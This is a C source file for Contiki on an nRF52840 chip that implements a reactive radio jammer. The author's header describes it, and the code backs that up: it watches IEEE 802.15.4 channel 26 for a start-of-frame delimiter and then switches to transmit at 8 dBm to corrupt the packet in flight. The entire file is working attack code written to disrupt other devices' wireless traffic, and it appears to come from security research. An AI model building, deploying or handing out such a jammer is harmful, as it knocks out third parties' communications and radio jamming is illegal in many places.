/**
 * \file
 *          A reactive SFD jammer that sniffs a channel for a SFD. 
 * 			When it senses the SFD will it switch from RX-mode to TX-mode 
 * 			and send out a burst of signals in order to corrupted the payload of 
 * 			the packet being sent. 
 *          
 * \author
 *          John Kanwar <johnkanwar@hotmail.com>
 */

#include "contiki.h"

#include <stdio.h>
#include "etimer.h"
#include "sys/rtimer.h"
#include "ble_dtm.h"
#include "dev/radio.h"
#include "net/netstack.h"
#include "watchdog.h"
#include "boards.h"
#include "nrf52840.h"
#include "sys/timer.h"
#include "nrf_radio.h"
#include "packetbuf.h"
#include "nrf_radio.h"
#include "nrf_delay.h"

/*---------------------------------------------------------------------------*/
PROCESS(reactive_process, "reactive process");
//AUTOSTART_PROCESSES(&reactive_process);
/*---------------------------------------------------------------------------*/

static rtimer_clock_t timeout_rtimer = RTIMER_SECOND * 0.000312;
static struct rtimer rtimer_timer;
static int amount_of_jams = 0;

/*---------------------------------------------------------------------------*/
static void perform_rtimer_callback()
{
	NRF_RADIO->TASKS_TXEN = 0U; /*Disable TX-mode*/
	NRF_RADIO->TASKS_STOP = 1U; /*Stop radio*/

//	printf("Rtimer callback called \n");

	/*Re-Enable the interrupt handler*/
	NRF_RADIO->INTENSET |= (1 << 14U);
	NRF_RADIO->INTENSET = RADIO_INTENSET_READY_Enabled << RADIO_INTENSET_READY_Pos | RADIO_INTENSET_END_Enabled << RADIO_INTENSET_END_Pos;
	NRF_RADIO->INTENSET = RADIO_INTENSET_FRAMESTART_Enabled << RADIO_INTENSET_FRAMESTART_Pos;

	/*Set priority for RADIO interrupt handler*/
	NVIC_SetPriority(RADIO_IRQn, 1); 
	NVIC_ClearPendingIRQ(RADIO_IRQn);

	NRF_RADIO->EVENTS_FRAMESTART = 0U; /*Clear the SFD interrupt handler*/

	NRF_RADIO->TASKS_RXEN = 1U; /*Enable RX-mode*/
	NRF_RADIO->TASKS_START = 1U; /*Start radio*/
//	printf("END of rtimer func\n");
}
/*---------------------------------------------------------------------------*/

static void RADIO_IRQHandler(void)
{

	/*If we sense a SFD trigger the interrupt handler will be called*/
	if (NRF_RADIO->EVENTS_FRAMESTART && (NRF_RADIO->INTENSET & RADIO_INTENSET_FRAMESTART_Msk)){
		NRF_RADIO->TASKS_TXEN = 1U;		   /*Enable the TX-mode*/
		NRF_RADIO->TXPOWER = 0x08UL;	   /*Set power level to 8dBm*/
		NRF_RADIO->EVENTS_FRAMESTART = 0U; /*Reset IRQ handler*/
		NRF_RADIO->TASKS_START = 1U;	   /*Start radio*/

		amount_of_jams++;
		printf("Amount of jams %d \n", amount_of_jams);
		printf("timeout_rtimer: %ld \n", timeout_rtimer);
		rtimer_set(&rtimer_timer, RTIMER_NOW() + timeout_rtimer, 10, perform_rtimer_callback, NULL);
	}
}

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(reactive_process, ev, data)
{

	radio_value_t tmp;

	PROCESS_BEGIN(); // Start process

	if (NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, 26) != RADIO_RESULT_OK){
		printf("ERROR: failed to change radio channel\n");
	}
	NETSTACK_MAC.off();
	NETSTACK_RADIO.on();
	
	/*Without this one does it crash*/
	if (NETSTACK_RADIO.get_value(RADIO_CONST_CHANNEL_MIN, &tmp) == RADIO_RESULT_OK){
		printf("OK! \n");
	}

	/*Enable intrrupt*/
	NRF_RADIO->INTENSET |= (1 << 14U);
	NRF_RADIO->INTENSET = RADIO_INTENSET_READY_Enabled << RADIO_INTENSET_READY_Pos | RADIO_INTENSET_END_Enabled << RADIO_INTENSET_END_Pos | RADIO_INTENSET_CCABUSY_Enabled << RADIO_INTENSET_CCABUSY_Pos;

	NVIC_SetPriority(RADIO_IRQn, 1);
	NVIC_ClearPendingIRQ(RADIO_IRQn);
	NVIC_EnableIRQ(RADIO_IRQn);

	/*Jump to interrupt handler*/
	 while (0)
	 {
		RADIO_IRQHandler();
	 	PROCESS_PAUSE();
	 }

	PROCESS_END();
}
/*---------------------------------------------------------------------------*/
